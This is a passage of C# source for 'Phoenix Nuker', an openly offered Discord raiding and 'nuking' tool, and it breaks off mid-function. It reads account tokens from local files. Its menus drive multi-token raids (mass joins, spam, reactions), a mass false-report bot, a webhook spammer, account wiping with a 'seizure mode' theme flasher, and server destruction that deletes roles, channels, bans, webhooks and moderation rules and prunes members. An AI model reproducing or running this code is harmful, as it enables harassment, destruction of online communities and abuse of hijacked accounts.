using System;
using Leaf.xNet;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using Newtonsoft.Json;
using System.Net.Http;
using System.Threading;
using System.Reflection;
using System.Diagnostics;
using BetterConsoleTables;
using System.Collections.Generic;
using Console = Colorful.Console;
using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Modes;
using System.Text.RegularExpressions;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Parameters;

/* 
       │ Author       : extatent
       │ Name         : phoenix-nuker
       │ GitHub       : https://github.com/extatent
*/

namespace nuker
{
    class Program
    {
        #region Configs
        public static string version = "8";
        public static string token;

        class Config
        {
            public string Token { get; set; }
        }

        static void GetConfig()
        {
            StreamReader read = new StreamReader("config.json");
            string json = read.ReadToEnd();
            Config config = JsonConvert.DeserializeObject<Config>(json);
            token = config.Token;
            read.Close();
        }

        static void SaveConfig(string token)
        {
            Config config = new Config { Token = token };
            var response = config;
            string json = JsonConvert.SerializeObject(response);
            File.WriteAllText("config.json", json);
        }

        static readonly List<string> clients = new List<string>();
        static ulong guildid;
        #endregion

        #region Write Logo, Write Line
        static void WriteLogo()
        {
            Console.Clear();
            Console.WriteLine();
            Console.WriteLine();
            string phoenix = @"                                  ██████╗ ██╗  ██╗ ██████╗ ███████╗███╗   ██╗██╗██╗  ██╗
                                  ██╔══██╗██║  ██║██╔═══██╗██╔════╝████╗  ██║██║╚██╗██╔╝
                                  ██████╔╝███████║██║   ██║█████╗  ██╔██╗ ██║██║ ╚███╔╝ 
                                  ██╔═══╝ ██╔══██║██║   ██║██╔══╝  ██║╚██╗██║██║ ██╔██╗ 
" + " > GitHub: github.com/extatent" + @"    ██║     ██║  ██║╚██████╔╝███████╗██║ ╚████║██║██╔╝ ██╗
" + " > Discord: dsc.gg/extatent " + @"      ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
                                                      ";
            Console.WriteWithGradient(phoenix, Color.OrangeRed, Color.Yellow, 16);
            Console.WriteLine();
            Console.WriteLine();
        }
        #endregion

        #region Main
        static void Main(string[] args)
        {
            Console.Title = "Phoenix Nuker";
            CheckVersion();
            Start();
        }
        #endregion

        #region Update
        static void CheckVersion()
        {
            try
            {
                WebClient web = new WebClient();

                if (!web.DownloadString("https://raw.githubusercontent.com/extatent/phoenix-nuker/main/version").Contains(version))
                {
                    int v2 = int.Parse(version) + 1;
                    Console.Title = "Phoenix Nuker | New version is available";
                    Console.Clear();
                    WriteLogo();
                    Console.WriteLine("New update is available: " + version + " > " + v2);
                    Console.WriteLine();
                    Console.WriteLine("Press any key to open Phoenix Nuker GitHub.");
                    Console.ReadKey();
                    Process.Start("https://github.com/extatent/phoenix-nuker/");
                    Environment.Exit(0);
                }
            }
            catch
            {
                Console.Clear();
                WriteLogo();
                Console.WriteLine("Please check your internet connection.");
                Console.ReadKey();
                Environment.Exit(0);
            }
        }
        #endregion

        #region Start
        static void Start()
        {
            WriteLogo();
            Console.ForegroundColor = Color.Yellow;
            string config = "config.json";
            if (!File.Exists(config))
            {
                try
                {
                    File.Create(config).Dispose();
                    File.WriteAllText(config, "{\"token\":\"\"}");
                }
                catch
                {
                    Environment.Exit(0);
                }
            }

            string tokens = "tokens.txt";
            if (!File.Exists(tokens))
            {
                try
                {
                    File.Create(tokens).Dispose();
                }
                catch
                {
                    Environment.Exit(0);
                }
            }

            GetConfig();
            Login();
        }
        #endregion

        #region Login
        static void Login()
        {
            try
            {
                WriteLogo();
                ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
                Table table = new Table(headers).AddRow("01", "Login With Config Token", "04", "Fetch User IDs").AddRow("02", "Login With DiscordApp Token", "05", "Delete Webhook").AddRow("03", "Multi Token Raider", "06", "Exit");
                table.Config = TableConfiguration.Unicode();
                Console.Write(table.ToString());
                Console.WriteLine();
                Console.WriteLine();
                Console.Write("Your choice: ");
                int options = int.Parse(Console.ReadLine());
                switch (options)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(2000);
                        Console.Clear();
                        Login();
                        break;
                    case 1:
                        if (string.IsNullOrEmpty(token))
                        {
                            try
                            {
                                Console.Clear();
                                WriteLogo();
                                Console.Write("Token: ");
                                string Token = Console.ReadLine();

                                if (Token.Contains("\""))
                                {
                                    Token = Token.Replace("\"", "");
                                }
                                if (Token.Contains("'"))
                                {
                                    Token = Token.Replace("'", "");
                                }

                                SaveConfig(Token);
                                token = Token;
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                                Thread.Sleep(2000);
                                if (File.Exists("config.json"))
                                {
                                    File.Delete("config.json");
                                }
                                Start();
                            }
                        }
                        break;
                    case 2:
                        try
                        {
                            token = GetToken();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                            Start();
                        }
                        break;
                    case 3:
                        var list = File.ReadAllLines("tokens.txt");
                        int count = 0;
                        foreach (var token in list)
                        {
                            count++;
                            clients.Add(token);
                        }
                        if (count == 0)
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("Paste your tokens in tokens.txt file.");
                            Thread.Sleep(2000);
                            Login();
                        }
                        Console.Title = "Phoenix Nuker | Total Accounts: " + count;
                        Raider();
                        break;
                    case 4:
                        if (!File.Exists("serverids.txt"))
                        {
                            File.Create("serverids.txt").Dispose();
                        }
                        var ids = File.ReadAllLines("serverids.txt");
                        foreach (string id in ids)
                        {
                            Server.GetIDs(token, ulong.Parse(id));
                        }
                        if (string.IsNullOrEmpty(File.ReadAllText("serverids.txt")))
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.WriteLine("Paste server IDs in serverids.txt file.");
                            Thread.Sleep(2000);
                            Login();
                        }
                        Login();
                        break;
                    case 5:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Webhook URL/ID: ");
                            ulong wid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Server.DeleteWebhook(token, wid);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                            Login();
                        }
                        Login();
                        break;
                    case 6:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(2000);
                Start();
            }

            WriteLogo();
            Options();
        }
        #endregion

        #region Options
        static void Options()
        {
            try
            {
                Console.Clear();
                WriteLogo();
                Console.Title = $"Phoenix Nuker | " + User.GetUsername(token);
                ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
                Table table = new Table(headers).AddRow("01", "Account Nuker", "04", "Webhook Spammer").AddRow("02", "Server Nuker", "05", "Login To Other Account").AddRow("03", "Report Bot", "06", "Exit");
                table.Config = TableConfiguration.Unicode();
                Console.Write(table.ToString());
                Console.WriteLine();
                Console.WriteLine();
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        DoneMethod4();
                        break;
                    case 1:
                        try
                        {
                            Console.Title = $"Phoenix Nuker | {User.GetUsername(token)}";
                            Console.Clear();
                            AccountNuker();
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        break;
                    case 2:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            if (string.IsNullOrEmpty(guildid.ToString()))
                            {
                                Console.Write("Guild ID: ");
                                ulong GuildID = ulong.Parse(Console.ReadLine());
                                guildid = GuildID;
                            }
                            if (Server.GetServerName(token, guildid) == "N/A")
                            {
                                Console.Clear();
                                WriteLogo();
                                Console.WriteLine("Invalid ID or you're not in the server.");
                                guildid = ulong.Parse("");
                                Thread.Sleep(2000);
                                Options();
                            }
                            Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Server.GetServerName(token, guildid)}";
                            Console.Clear();
                            ServerNuker();
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        break;
                    case 3:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Guild ID: ");
                            string guildID = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            string channelid = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message ID: ");
                            string messageid = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            ColumnHeader[] headers2 = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
                            Table table2 = new Table(headers2).AddRow("01", "Illegal Content").AddRow("02", "Harrassment").AddRow("03", "Spam or Phishing Links").AddRow("04", "Self harm").AddRow("05", "NSFW");
                            table2.Config = TableConfiguration.Unicode();
                            Console.Write(table2.ToString());
                            Console.WriteLine();
                            Console.WriteLine();
                            Console.Write("Your choice: ");
                            string reason = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Reports count: ");
                            int count = int.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            HttpRequest httpRequest = new HttpRequest();
                            httpRequest.Authorization = token;
                            httpRequest.UserAgentRandomize();
                            string url = $"https://discord.com/api/v{nuker.Config.APIVersion}/report";

                            string jsonData = string.Concat(new string[]
                            {
                                "{\"channel_id\": \"",
                                channelid,
                                "\", \"guild_id\": \"",
                                guildID,
                                "\", \"message_id\": \"",
                                messageid,
                                "\", \"reason\": \"",
                                reason,
                                "\" }"
                            });

                            int reports = 0;
                            for (int i = 0; i < count; i++)
                            {
                                try
                                {
                                    HttpResponse response = httpRequest.Post(url, jsonData, "application/json");
                                    bool status = response.StatusCode.ToString() == "Created";
                                    if (status)
                                    {
                                        reports++;
                                        Console.WriteLine("Reports sent: " + reports);
                                    }
                                }
                                catch
                                { }
                            }
                            Console.Title = $"Phoenix Nuker | {User.GetUsername(token)}";
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        DoneMethod3();
                        break;
                    case 4:
                        Console.Clear();
                        WriteLogo();
                        try
                        {
                            Console.Write("Webhook: ");
                            string webhook = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string message = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Count: ");
                            string mcount = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();

                            int total = 0;
                            for (int i = 0; i < int.Parse(mcount); i++)
                            {
                                try
                                {
                                    total++;
                                    Webhook hook = new Webhook(webhook);
                                    hook.SendMessage(message);
                                    Console.WriteLine("Messages sent: " + total);
                                    Thread.Sleep(2000);
                                }
                                catch { }
                            }
                        }
                        catch
                        {
                            DoneMethod4();
                        }
                        DoneMethod3();
                        break;
                    case 5:
                        if (File.Exists("config.json"))
                        {
                            File.Delete("config.json");
                        }
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                        break;
                    case 6:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(2000);
                Options();
            }
        }
        #endregion

        #region Webhook class
        class Webhook
        {
            private HttpClient Client;
            private string Url;

            public Webhook(string webhookUrl)
            {
                Client = new HttpClient();
                Url = webhookUrl;
            }

            public bool SendMessage(string content)
            {
                MultipartFormDataContent data = new MultipartFormDataContent();
                data.Add(new System.Net.Http.StringContent("Phoenix Nuker"), "username");
                data.Add(new System.Net.Http.StringContent(content), "content");
                var resp = Client.PostAsync(Url, data).Result;
                return resp.StatusCode == System.Net.HttpStatusCode.NoContent;
            }
        }
        #endregion

        #region Done methods
        static void DoneMethod()
        {
            Console.WriteLine("Done");
            Thread.Sleep(2000);
            Console.Clear();
            AccountNuker();
        }

        static void DoneMethod2()
        {
            Console.WriteLine("Done");
            Thread.Sleep(2000);
            Console.Clear();
            ServerNuker();
        }

        static void DoneMethod3()
        {
            Console.WriteLine("Done");
            Thread.Sleep(2000);
            Console.Clear();
            Options();
        }

        static void DoneMethod4()
        {
            Thread.Sleep(2000);
            Console.Clear();
            Options();
        }

        static void DoneMethod5()
        {
            Console.WriteLine("Done");
            Thread.Sleep(2000);
            Console.Clear();
            Raider();
        }
        #endregion

        #region Raider
        static void Raider()
        {
            try
            {
                Console.Clear();
                WriteLogo();
                Console.ForegroundColor = Color.Yellow;
                ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left),  };
                Table table = new Table(headers).AddRow("01", "Join Guild", "07", "Block User").AddRow("02", "Leave Guild", "08", "DM User").AddRow("03", "Add Friend", "09", "Leave Group").AddRow("04", "Spam", "10", "Fake Type").AddRow("05", "Add Reaction", "11", "Go Back").AddRow("06", "Join Group", "12", "Exit");
                table.Config = TableConfiguration.Unicode();
                Console.Write(table.ToString());
                Console.WriteLine();
                Console.WriteLine();
                Console.Write("Your choice: ");
                int option = Convert.ToInt32(Console.ReadLine());
                switch (option)
                {
                    default:
                        Console.WriteLine("Not a valid option.");
                        Thread.Sleep(2000);
                        Console.Clear();
                        Raider();
                        break;
                    case 1:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Invite code: ");
                            string code = Console.ReadLine();
                            if (code.Contains("https://discord.gg/"))
                            {
                                code = code.Replace("https://discord.gg/", "");
                            }
                            if (code.Contains("https://discord.com/invite/"))
                            {
                                code = code.Replace("https://discord.com/invite/", "");
                            }
                            Console.Clear();
                            WriteLogo();
                            foreach (var joinguild in clients)
                            {
                                Raid.JoinGuild(joinguild, code);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 2:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Guild ID: ");
                            ulong id = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.LeaveGuild(token, id);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 3:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Username#TAG: ");
                            string full = Console.ReadLine();
                            string user = full.Split('#')[0];
                            uint discriminator = uint.Parse(full.Split('#')[1]);
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.AddFriend(token, user, discriminator);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 4:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Count: ");
                            int count = int.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            for (int i = 0; i < count; i++)
                            {
                                foreach (var token in clients)
                                {
                                    Raid.SendMessage(token, cid, msg);
                                }
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 5:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid2 = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message ID: ");
                            ulong mid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            ColumnHeader[] headers2 = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
                            Table table2 = new Table(headers2).AddRow("01", "Heart", "06", "Billed Cap").AddRow("02", "White Check Mark", "07", "Negative Squared Cross Mark").AddRow("03", "Regional Indicator L", "08", "Neutral Face").AddRow("04", "Regional Indicator W", "09", "Nerd Face").AddRow("05", "Middle Finger", "10", "Joy");
                            table2.Config = TableConfiguration.Unicode();
                            Console.Write(table2.ToString());
                            Console.WriteLine();
                            Console.WriteLine();
                            Console.Write("Your choice: ");
                            string choice = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            if (choice == "1")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "❤️");
                                }
                            }
                            if (choice == "2")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "✅");
                                }
                            }
                            if (choice == "3")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🇱");
                                }
                            }
                            if (choice == "4")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🇼");
                                }
                            }
                            if (choice == "5")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🖕");
                                }
                            }
                            if (choice == "6")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🧢");
                                }
                            }
                            if (choice == "7")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "❎");
                                }
                            }
                            if (choice == "8")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "😐");
                                }
                            }
                            if (choice == "9")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "🤓");
                                }
                            }
                            if (choice == "10")
                            {
                                foreach (var token in clients)
                                {
                                    Raid.AddReaction(token, cid2, mid, "😂");
                                }
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 6:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Invite code: ");
                            string inv = Console.ReadLine();
                            if (inv.Contains("https://discord.gg/"))
                            {
                                inv = inv.Replace("https://discord.gg/", "");
                            }
                            if (inv.Contains("https://discord.com/invite/"))
                            {
                                inv = inv.Replace("https://discord.com/invite/", "");
                            }
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.JoinGroup(token, inv);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 7:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("User ID: ");
                            ulong uid2 = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.BlockUser(token, uid2);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 8:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("User ID: ");
                            ulong uid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Message: ");
                            string msg = Console.ReadLine();
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {

                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 9:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Group ID: ");
                            ulong gid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.LeaveGroup(token, gid);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 10:
                        try
                        {
                            Console.Clear();
                            WriteLogo();
                            Console.Write("Channel ID: ");
                            ulong cid = ulong.Parse(Console.ReadLine());
                            Console.Clear();
                            WriteLogo();
                            foreach (var token in clients)
                            {
                                Raid.TriggerTyping(token, cid);
                            }
                            DoneMethod5();
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                            Thread.Sleep(2000);
                        }
                        Raider();
                        break;
                    case 11:
                        Console.Title = "Phoenix Nuker";
                        Start();
                        break;
                    case 12:
                        Environment.Exit(0);
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Thread.Sleep(2000);
                Raider();
            }
        }
        #endregion

        #region Account nuker
        static void AccountNuker()
        {
            WriteLogo();
            Console.ForegroundColor = Color.Yellow;
            ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
            Table table = new Table(headers).AddRow("01", "Edit Profile", "07", "Mass Create Guilds", "13", "Delete DMs").AddRow("02", "Leave/Delete Guilds", "08", "Seizure Mode", "14", "Go Back").AddRow("03", "Clear Relationships", "09", "Confuse Mode", "15", "Exit").AddRow("04", "Leave HypeSquad", "10", "Mass DM").AddRow("05", "Remove Connections", "11", "User Info").AddRow("06", "Deauthorize Apps", "12", "Block Relationships");
            table.Config = TableConfiguration.Unicode();
            Console.Write(table.ToString());
            Console.WriteLine();
            Console.WriteLine();
            Console.Write("Your choice: ");
            int option = Convert.ToInt32(Console.ReadLine());
            switch(option)
            {
                default:
                    Console.WriteLine("Not a valid option.");
                    Thread.Sleep(2000);
                    Console.Clear();
                    AccountNuker();
                    break;
                case 1:
                    Console.Clear();
                    WriteLogo();
                    ColumnHeader[] headers2 = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left)};
                    Table table2 = new Table(headers2).AddRow("00", "None").AddRow("01", "Bravery").AddRow("02", "Brilliance").AddRow("03", "Balance");
                    table2.Config = TableConfiguration.Unicode();
                    Console.Write(table2.ToString());
                    Console.WriteLine();
                    Console.WriteLine();
                    Console.Write("Your choice: ");
                    string hypesquad = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();
                    Console.Write("Biography: ");
                    string bio = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();
                    Console.Write("Custom Status: ");
                    string status = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();
                    User.EditProfile(token, hypesquad, bio, status);
                    DoneMethod();
                    break;
                case 2:
                    Console.Clear();
                    WriteLogo();
                    User.LeaveDeleteGuilds(token);
                    DoneMethod();
                    break;
                case 3:
                    Console.Clear();
                    WriteLogo();
                    User.ClearRelationships(token);
                    DoneMethod();
                    break;
                case 4:
                    Console.Clear();
                    WriteLogo();
                    User.LeaveHypeSquad(token);
                    DoneMethod();
                    break;
                case 5:
                    Console.Clear();
                    WriteLogo();
                    User.RemoveConnections(token);
                    DoneMethod();
                    break;
                case 6:
                    Console.Clear();
                    WriteLogo();
                    User.DeauthorizeApps(token);
                    DoneMethod();
                    break;
                case 7:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Guild name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count (max 100): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            numb++;
                            User.CreateGuild(token, name);
                            Console.WriteLine($"Created: {numb}");
                        }

                    }
                    catch
                    { }
                    DoneMethod();
                    break;
                case 8:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count: ");
                        string count = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < int.Parse(count); i++)
                        {
                            numb++;
                            User.ChangeTheme(token, "light");
                            User.ChangeTheme(token, "dark");
                            Console.WriteLine($"Changed: {numb}");
                        }
                    }
                    catch { }
                    DoneMethod();
                    break;
                case 9:
                    Console.Clear();
                    WriteLogo();
                    User.ConfuseMode(token);
                    DoneMethod();
                    break;
                case 10:
                    Console.Clear();
                    WriteLogo();
                    Console.Write("Message: ");
                    string message = Console.ReadLine();
                    Console.Clear();
                    WriteLogo();
                    User.MassDM(token, message);
                    DoneMethod();
                    break;
                case 11:
                    Console.Clear();
                    WriteLogo();
                    User.UserInformation(token);
                    AccountNuker();
                    break;
                case 12:
                    Console.Clear();
                    WriteLogo();
                    User.BlockRelationships(token);
                    DoneMethod();
                    break;
                case 13:
                    Console.Clear();
                    WriteLogo();
                    User.DeleteDMs(token);
                    DoneMethod();
                    break;
                case 14:
                    Console.Clear();
                    WriteLogo();
                    Options();
                    break;
                case 15:
                    Environment.Exit(0);
                    break;
            }
        }
        #endregion

        #region Server Nuker
        static void ServerNuker()
        {
            WriteLogo();
            Console.ForegroundColor = Color.Yellow;
            ColumnHeader[] headers = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left), new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
            Table table = new Table(headers).AddRow("01", "Delete All Roles", "09", "Remove Integrations", "17", "Mass Create Invites").AddRow("02", "Remove All Bans", "10", "Delete All Reactions", "18", "Delete Guild Scheduled Events").AddRow("03", "Delete All Channels", "11", "Server Info", "19", "Delete Guild Template").AddRow("04", "Delete All Emojis", "12", "Leave/Delete Server", "20", "Delete Stage Instances").AddRow("05", "Delete All Invites", "13", "Msg In Every Channel", "21", "Delete Webhooks").AddRow("06", "Mass Create Roles", "14", "Delete Stickers", "22", "Go Back").AddRow("07", "Mass Create Channels", "15", "Mass DM", "23", "Exit").AddRow("08", "Prune Members", "16", "Delete Auto Moderation Rules");
            table.Config = TableConfiguration.Unicode();
            Console.Write(table.ToString());
            Console.WriteLine();
            Console.WriteLine();
            Console.Write("Your choice: ");
            int option = Convert.ToInt32(Console.ReadLine());
            switch(option)
            {
                default:
                    Console.WriteLine("Not a valid option.");
                    Thread.Sleep(2000);
                    Console.Clear();
                    ServerNuker();
                    break;
                case 1:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteRoles(token, guildid);
                    DoneMethod2();
                    break;
                case 2:
                    Console.Clear();
                    WriteLogo();
                    Server.RemoveBans(token, guildid);
                    DoneMethod2();
                    break;
                case 3:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteChannels(token, guildid);
                    DoneMethod2();
                    break;
                case 4:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteEmojis(token, guildid);
                    DoneMethod2();
                    break;
                case 5:
                    Console.Clear();
                    WriteLogo();
                    Server.DeleteInvites(token, guildid);
                    DoneMethod2();
                    break;
                case 6:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Role name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count (max 250): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            try
                            {
                                numb++;
                                Server.CreateRole(token, guildid, name);
                                Console.WriteLine("Created: " + numb);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 7:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Channel name: ");
                        string name = Console.ReadLine();
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Count (max 500): ");
                        int count = int.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();
                        int numb = 0;
                        for (int i = 0; i < count; i++)
                        {
                            try
                            {
                                numb++;
                                Server.CreateChannel(token, guildid, name);
                                Console.WriteLine("Created: " + numb);
                            }
                            catch { }
                        }
                    }
                    catch
                    { }
                    DoneMethod2();
                    break;
                case 8:
                    Console.Clear();
                    WriteLogo();
                    Server.PruneMembers(token, guildid);
                    DoneMethod2();
                    break;
                case 9:
                    Console.Clear();
                    WriteLogo();
                    Server.RemoveIntegrations(token, guildid);
                    DoneMethod2();
                    break;
                case 10:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Channel ID: ");
                        ulong cid = ulong.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Message ID: ");
                        ulong mid = ulong.Parse(Console.ReadLine());
                        Console.Clear();
                        WriteLogo();
                        Server.DeleteAllReactions(token, cid, mid);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        Thread.Sleep(2000);
                    }
                    DoneMethod2();
                    break;
                case 11:
                    Console.Clear();
                    WriteLogo();
                    Server.ServerInformation(token, guildid);
                    ServerNuker();
                    break;
                case 12:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        Console.Write("Your server (Y/N): ");
                        string owner = Console.ReadLine().ToLower();
                        Console.Clear();
                        WriteLogo();
                        Server.LeaveDeleteGuild(token, guildid, owner);
                        DoneMethod2();
                    }
                    catch 
                    {
                        Console.WriteLine("Wrong response");
                        Thread.Sleep(2000);
                    }
                    break;
                case 13:
                    try
                    {
                        Console.Clear();
                        WriteLogo();
                        ColumnHeader[] headers2 = new[] { new ColumnHeader("##", Alignment.Left), new ColumnHeader("Choice", Alignment.Left) };
                        Table table2 = new Table(headers2).AddRow("01", "Spam").AddRow("02", "One Message");
